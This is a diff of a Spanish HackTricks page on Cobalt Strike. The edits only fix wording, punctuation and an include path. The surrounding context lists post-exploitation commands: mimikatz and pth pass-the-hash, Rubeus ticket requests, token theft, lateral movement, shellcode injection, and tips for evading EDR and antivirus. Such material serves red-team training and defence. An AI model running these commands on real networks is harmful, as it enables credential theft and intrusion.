@@ -1,6 +1,6 @@
 # Cobalt Strike
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
 
 ### Escuchas
 
@@ -14,7 +14,7 @@ Los beacons de estos escuchas no necesitan comunicarse directamente con el C2, p
 
 `Cobalt Strike -> Escuchas -> Agregar/Editar` luego necesitas seleccionar los beacons TCP o SMB
 
-* El **beacon TCP establecerá un escucha en el puerto seleccionado**. Para conectarte a un beacon TCP usa el comando `connect <ip> <port>` desde otro beacon
+* El **beacon TCP establecerá un escucha en el puerto seleccionado**. Para conectarte a un beacon TCP usa el comando `connect <ip> <port>` desde otro beacon.
 * El **beacon smb escuchará en un pipename con el nombre seleccionado**. Para conectarte a un beacon SMB necesitas usar el comando `link [target] [pipe]`.
 
 ### Generar y alojar cargas útiles
@@ -24,13 +24,13 @@ Los beacons de estos escuchas no necesitan comunicarse directamente con el C2, p
 `Attacks -> Packages ->`
 
 * **`HTMLApplication`** para archivos HTA
-* **`MS Office Macro`** para un documento de oficina con una macro
+* **`MS Office Macro`** para un documento de office con una macro
 * **`Windows Executable`** para un .exe, .dll o servicio .exe
 * **`Windows Executable (S)`** para un **stageless** .exe, .dll o servicio .exe (mejor stageless que staged, menos IoCs)
 
 #### Generar y alojar cargas útiles
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/executable para descargar el beacon de cobalt strike en formatos como: bitsadmin, exe, powershell y python
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/executable para descargar el beacon de cobalt strike en formatos como: bitsadmin, exe, powershell y python.
 
 #### Alojar Cargas Útiles
 
@@ -94,13 +94,13 @@ inject [pid] [x64|x86] [listener]
 ## Desde un punto de vista de OpSec: No realices inyección entre plataformas a menos que realmente sea necesario (por ejemplo, x86 -> x64 o x64 -> x86).
 
 ## Pasar el hash
-## Este proceso de modificación requiere parches en la memoria de LSASS, lo cual es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si el Proceso Protegido Ligero (PPL) está habilitado.
+## Este proceso de modificación requiere parchar la memoria de LSASS, lo cual es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si el Proceso Protegido Ligero (PPL) está habilitado.
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pasar el hash a través de mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá el shell (si estás ejecutando como SYSTEM, estás bien)
+## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá el shell (si estás ejecutando como SYSTEM, estás bien).
 steal_token <pid> #Robar token del proceso creado por mimikatz
 
 ## Pasar el ticket
@@ -109,7 +109,7 @@ execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Crear una nueva sesión de inicio de sesión para usar con el nuevo ticket (para no sobrescribir el comprometido)
 make_token <domain>\<username> DummyPass
-## Escribir el ticket en la máquina del atacante desde una sesión de poweshell y cargarlo
+## Escribir el ticket en la máquina del atacante desde una sesión de powershell y cargarlo
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -140,7 +140,7 @@ jump [method] [target] [listener]
 ## psexec_psh                x86   Usar un servicio para ejecutar una línea de PowerShell
 ## winrm                     x86   Ejecutar un script de PowerShell a través de WinRM
 ## winrm64                   x64   Ejecutar un script de PowerShell a través de WinRM
-## wmi_msbuild               x64   movimiento lateral wmi con tarea inline c# msbuild (oppsec)
+## wmi_msbuild               x64   movimiento lateral wmi con tarea en línea c# msbuild (oppsec)
 
 
 remote-exec [method] [target] [command] # remote-exec no devuelve salida
@@ -177,7 +177,7 @@ shinject <pid> x64 C:\Payloads\msf.bin #Inyectar shellcode de metasploit en un p
 
 # Pasar sesión de metasploit a cobalt strike
 ## Generar shellcode Beacon stageless, ir a Attacks > Packages > Windows Executable (S), seleccionar el listener deseado, seleccionar Raw como el tipo de salida y seleccionar Usar carga útil x64.
-## Usar post/windows/manage/shellcode_inject en metasploit para inyectar el shellcode generado de cobalt strike
+## Usar post/windows/manage/shellcode_inject en metasploit para inyectar el shellcode generado de cobalt strike.
 
 
 # Pivotar
@@ -206,10 +206,10 @@ Podrías verificar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents Po
 
 - Seguridad EID 4624 - Ver todos los inicios de sesión interactivos para conocer las horas de operación habituales.
 - Sistema EID 12,13 - Ver la frecuencia de apagado/inicio/suspensión.
-- Seguridad EID 4624/4625 - Ver intentos NTLM válidos/inválidos entrantes.
+- Seguridad EID 4624/4625 - Ver intentos válidos/no válidos de NTLM entrantes.
 - Seguridad EID 4648 - Este evento se crea cuando se utilizan credenciales en texto plano para iniciar sesión. Si un proceso lo generó, el binario potencialmente tiene las credenciales en texto claro en un archivo de configuración o dentro del código.
 
-Al usar `jump` desde cobalt strike, es mejor usar el método `wmi_msbuild` para que el nuevo proceso parezca más legítimo.
+Al usar `jump` desde cobalt strike, es mejor usar el método `wmi_msbuild` para hacer que el nuevo proceso parezca más legítimo.
 
 ### Usar cuentas de computadora
 
@@ -232,11 +232,11 @@ Esto permite almacenar tokens **por beacon** para que no sea necesario robar el 
 - token-store remove <id>
 - token-store remove-all
 
-Al moverse lateralmente, generalmente es mejor **robar un token que generar uno nuevo** o realizar un ataque de pasar el hash.
+Al moverte lateralmente, generalmente es mejor **robar un token que generar uno nuevo** o realizar un ataque de pasar el hash.
 
 ### Guardrails
 
-Cobalt Strike tiene una función llamada **Guardrails** que ayuda a prevenir el uso de ciertos comandos o acciones que podrían ser detectados por los defensores. Los guardrails se pueden configurar para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec`, y otros que se utilizan comúnmente para movimiento lateral o escalada de privilegios.
+Cobalt Strike tiene una función llamada **Guardrails** que ayuda a prevenir el uso de ciertos comandos o acciones que podrían ser detectadas por los defensores. Los guardrails se pueden configurar para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec`, y otros que se utilizan comúnmente para movimiento lateral o escalada de privilegios.
 
 Además, el repositorio [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) también contiene algunas verificaciones e ideas que podrías considerar antes de ejecutar una carga útil.
 
@@ -250,7 +250,7 @@ Al usar Cobalt Strike por defecto, los pipes SMB tendrán el nombre `msagent_###
 
 Además, con sesiones SSH se crea un pipe llamado `\\.\pipe\postex_ssh_####`. Cámbialo con `set ssh_pipename "<new_name>";`.
 
-También en el ataque de post explotación, los pipes `\\.\pipe\postex_####` pueden ser modificados con `set pipename "<new_name>"`.
+También en el ataque de post explotación, los pipes `\\.\pipe\postex_####` se pueden modificar con `set pipename "<new_name>"`.
 
 En los perfiles de Cobalt Strike también puedes modificar cosas como:
 
@@ -274,7 +274,7 @@ Al inyectar código en un proceso, esto suele ser muy ruidoso, esto se debe a qu
 
 Al generar un nuevo proceso, es importante **mantener una relación padre-hijo regular** entre los procesos para evitar la detección. Si svchost.exec está ejecutando iexplorer.exe, parecerá sospechoso, ya que svchost.exe no es un padre de iexplorer.exe en un entorno normal de Windows.
 
-Cuando se genera un nuevo beacon en Cobalt Strike, por defecto se crea un proceso utilizando **`rundll32.exe`** para ejecutar el nuevo listener. Esto no es muy sigiloso y puede ser fácilmente detectado por EDRs. Además, `rundll32.exe` se ejecuta sin argumentos, lo que lo hace aún más sospechoso.
+Cuando se genera un nuevo beacon en Cobalt Strike, por defecto se crea un proceso que utiliza **`rundll32.exe`** para ejecutar el nuevo listener. Esto no es muy sigiloso y puede ser fácilmente detectado por EDRs. Además, `rundll32.exe` se ejecuta sin argumentos, lo que lo hace aún más sospechoso.
 
 Con el siguiente comando de Cobalt Strike, puedes especificar un proceso diferente para generar el nuevo beacon, haciéndolo menos detectable:
 ```bash
@@ -284,11 +284,11 @@ Puedes también cambiar esta configuración **`spawnto_x86` y `spawnto_x64`** en
 
 ### Proxying attackers traffic
 
-Los atacantes a veces necesitarán poder ejecutar herramientas localmente, incluso en máquinas Linux, y hacer que el tráfico de las víctimas llegue a la herramienta (por ejemplo, NTLM relay).
+A veces, los atacantes necesitarán poder ejecutar herramientas localmente, incluso en máquinas Linux, y hacer que el tráfico de las víctimas llegue a la herramienta (por ejemplo, NTLM relay).
 
-Además, a veces para realizar un ataque de pass-the-hash o pass-the-ticket es más sigiloso para el atacante **agregar este hash o ticket en su propio proceso LSASS** localmente y luego pivotar desde él en lugar de modificar un proceso LSASS de una máquina víctima.
+Además, a veces, para realizar un ataque de pass-the-hash o pass-the-ticket, es más sigiloso para el atacante **agregar este hash o ticket en su propio proceso LSASS** localmente y luego pivotar desde él en lugar de modificar un proceso LSASS de una máquina víctima.
 
-Sin embargo, debes tener **cuidado con el tráfico generado**, ya que podrías estar enviando tráfico poco común (¿kerberos?) desde tu proceso de puerta trasera. Para esto podrías pivotar a un proceso de navegador (aunque podrías ser atrapado inyectándote en un proceso, así que piensa en una forma sigilosa de hacerlo).
+Sin embargo, debes tener **cuidado con el tráfico generado**, ya que podrías estar enviando tráfico poco común (¿kerberos?) desde tu proceso de puerta trasera. Para esto, podrías pivotar a un proceso de navegador (aunque podrías ser atrapado inyectándote en un proceso, así que piensa en una forma sigilosa de hacerlo).
 ```bash
 
 ### Avoiding AVs
@@ -358,10 +358,10 @@ template.x64.ps1
 # $x --> $ar  
 cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  
 
-#artifact kit  
+#kit de artefactos  
 cd  C:\Tools\cobaltstrike\ArtifactKit  
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
 
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
